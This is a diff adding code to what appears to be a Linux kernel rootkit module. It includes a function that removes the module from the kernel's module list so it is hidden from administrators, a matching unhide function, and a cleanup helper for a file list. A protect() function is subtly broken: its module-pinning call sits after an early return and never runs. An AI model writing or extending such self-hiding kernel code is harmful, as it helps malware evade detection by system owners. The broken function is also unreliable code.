@@ -405,3 +405,55 @@ void file_remove(const char *name)
     }
 }
 
+void file_remove_all(void)
+{
+    struct file_entry *f, *tmp;
+
+    list_for_each_entry_safe(f, tmp, &file_list, list) {
+        list_del(&f->list);
+        kfree(f->name);
+        kfree(f);
+    }
+}
+
+struct list_head *module_list;
+int is_hidden = 0;
+
+void hide(void)
+{
+
+    if (is_hidden){
+        return;
+    }
+
+    module_list = THIS_MODULE->list.prev;
+
+    list_del(&THIS_MODULE->list);
+
+    is_hidden = 1;
+}
+
+void unhide(void)
+{
+
+    if (!is_hidden){
+        return;
+    }
+
+    list_add(&THIS_MODULE->list, module_list);
+
+    is_hidden = 0;
+}
+
+int is_protected = 0;
+
+void protect(void)
+{
+    if (is_protected){
+        return;
+        
+        try_module_get(THIS_MODULE);
+
+        is_protected = 1;
+    }
+}
